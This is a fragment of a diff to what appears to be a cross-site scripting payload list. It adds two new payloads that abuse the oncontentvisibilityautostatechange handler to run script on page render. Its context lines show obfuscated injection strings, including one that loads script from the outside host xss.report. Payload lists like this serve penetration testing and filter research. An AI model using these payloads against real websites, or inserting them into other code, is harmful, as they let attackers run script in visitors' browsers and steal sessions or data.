@@ -4144,3 +4144,5 @@ ddd");<​/script><​script>alert("XSS");<​/script><​script>aaa("
 <Svg/OnLoad=alert%25%0A26lpar;1)>
 \%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>
 </scrpt><scrpt/src=//xss.report/c/target-1></scrpt>
+<input type="hidden" oncontentvisibilityautostatechange="alert(/momika233/)" style="content-visibility:auto">
+<p oncontentvisibilityautostatechange="alert(/momika233/)" style="content-visibility:auto">
